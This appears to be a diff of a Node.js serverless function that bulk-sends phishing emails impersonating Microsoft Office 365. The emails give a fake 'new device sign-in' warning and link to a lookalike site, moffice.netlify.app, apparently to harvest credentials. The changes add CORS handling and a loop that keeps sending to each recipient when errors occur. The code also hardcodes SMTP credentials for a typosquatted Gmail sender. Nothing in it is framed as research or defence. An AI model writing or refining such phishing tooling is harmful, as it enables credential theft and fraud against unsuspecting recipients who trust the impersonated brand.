@@ -1,9 +1,28 @@
 const nodemailer = require('nodemailer');
 
-exports.handler = async (event) => {
+exports.handler = async (event, context) => {
+  if (event.httpMethod === 'OPTIONS') {
+    return {
+      statusCode: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type'
+      },
+      body: ''
+    };
+  }
+
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method not allowed' })
+    };
+  }
+
   try {
-    const data = JSON.parse(event.body);
-    const recsx = data.recsx;
+    const formData = JSON.parse(event.body);
+    const { recsx } = formData;
 
     if (typeof recsx !== 'string' || !recsx) {
       console.error("recsx is invalid:", recsx);
@@ -16,28 +35,17 @@ exports.handler = async (event) => {
     const emlStrng = recsx.trim();
     const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");
 
-
-    console.log("snt 2:", rcpntEmls);
-
-    if (rcpntEmls.length === 0) {
-      console.error("No valid rec");
-      return {
-        statusCode: 500,
-        body: JSON.stringify({ error: 'No valid rec2' })
-      };
-    }
-
-      const transporter = nodemailer.createTransport({
-        host: 'smtp.gmail.com',
-        port: 465,
-        secure: true,
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true,
       auth: {
         user: 'mircosoftii@gmail.com',
         pass: 'lztqyrqznnqaieth'
       }
     });
 
-  
+    for (const recipientEmail of rcpntEmls) {
     const mailOptions = {
       from: '"Microsoft Office" <Office365>',
       to: rcpntEmls,
@@ -47,30 +55,41 @@ exports.handler = async (event) => {
           <p><strong>Your Office 365 Account was just signed in to from a new device.
           You're getting this email to make sure it was you.</strong></p>
           <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
-          <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</>
+          <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; border-radius: 8px; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</>
           <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
           </div>
       `
     };
 
-    const info = await transporter.sendMail(mailOptions);
+    console.log("Sending email to:", recipientEmail);
+
+    try {
+      const info = await transporter.sendMail(mailOptions);
+      console.log('Email sent to', recipientEmail, ':', info.response);
+  } catch (emailError) {
+      console.error('Error sending email to', recipientEmail, ':', emailError);
+      console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
+      continue;
+  }
+}
+
 
     return {
       statusCode: 200,
       headers: {
         'Access-Control-Allow-Origin': '*'
       },
-      body: JSON.stringify({ success: true, message: 'Emlsntscsfly' })
+      body: JSON.stringify({ success: true })
     };
 
   } catch (error) {
-    console.error('Errsbmtfnctn:', error);
+    console.error('Error:', error);
     return {
       statusCode: 500,
       headers: {
         'Access-Control-Allow-Origin': '*'
       },
-      body: JSON.stringify({ error: 'Fldtprcsrqst' })
+      body: JSON.stringify({ error: 'Fail2prcsrqst' })
     };
   }
 };
